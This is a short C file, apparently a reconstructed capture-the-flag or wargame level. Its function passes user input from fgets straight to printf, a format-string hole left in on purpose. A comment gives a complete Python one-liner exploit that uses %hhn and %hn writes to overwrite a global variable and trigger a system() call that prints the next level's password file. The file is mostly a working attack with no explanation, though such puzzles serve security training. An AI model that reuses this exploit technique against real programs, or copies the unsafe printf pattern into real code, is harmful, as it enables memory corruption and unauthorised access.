#include <stdio.h>
#include <stdlib.h>

int m = 0;

void p(char *s)
{
    printf(s);
}

void n(void)
{
    char buf[520];

    fgets(buf, 512, stdin);
    p(buf);

    if (m == 0x1025544)
        system("/bin/cat /home/user/level5/.pass");
}

// python -c "import struct,sys;sys.stdout.write(struct.pack('<I',0x8049810)+struct.pack('<I',0x8049811)+struct.pack('<I',0x8049812)+'A'*56+'%12\$hhn'+'A'*17+'%13\$hhn'+'A'*173+'%14\$hn')" | /home/user/level4/level4
int main(void)
{
    n();
    return 0;
}
